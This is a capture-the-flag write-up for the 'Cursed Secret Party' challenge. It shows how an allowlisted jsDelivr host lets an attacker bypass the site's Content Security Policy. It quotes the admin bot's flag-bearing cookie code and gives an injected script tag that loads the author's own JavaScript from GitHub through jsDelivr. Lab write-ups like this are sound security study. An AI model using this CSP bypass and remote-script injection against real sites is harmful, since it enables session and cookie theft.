# Cursed Secret Party

We start on this web page:

<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We capture the request and see that it looks like this:

<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In the response we can see a CSP, so we head to [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/) and look to see if the CSP is safe:

<figure><img src="../../../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

the&#x20;

script-src is not safe according to the website&#x20;

```
Host allowlists can frequently be bypassed. Consider using 'strict-dynamic' in combination with CSP nonces or hashes.
```

on top of that The cdn.jsdelivr.net host is whitelisted to load JavaScript files. JSDeliver is a free CDN that allows for loading any JavaScript files hosted in NPM or GitHub

in the bot.js file i find the following line to show the flag:&#x20;

```
	let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
```

```
const visit = async () => {
    try {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();

		let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});

		await page.goto('http://127.0.0.1:1337/admin', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		setTimeout(() => {
			browser.close();
		}, 5000);
```

```
<script src="https://github.com/felixbillieres/HTBjsdelivryexploit/blob/main/test.js"> </script>
```

the syntax to create a jsDeliver file is [https://cdn.jsdelivr.net/gh/\<USERNAME>/\<REPO>@\<BRANCH>/\<PATH\_TO\_FILE>\
](https://cdn.jsdelivr.net/gh/%3CUSERNAME%3E/%3CREPO%3E@%3CBRANCH%3E/%3CPATH_TO_FILE%3E) so i adapt it to my repo:

[https://cdn.jsdelivr.net/gh/felixbillieres/HTBjsdelivryexploit@main/test.js](https://cdn.jsdelivr.net/gh/felixbillieres/HTBjsdelivryexploit@main/test.js)-- -

<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
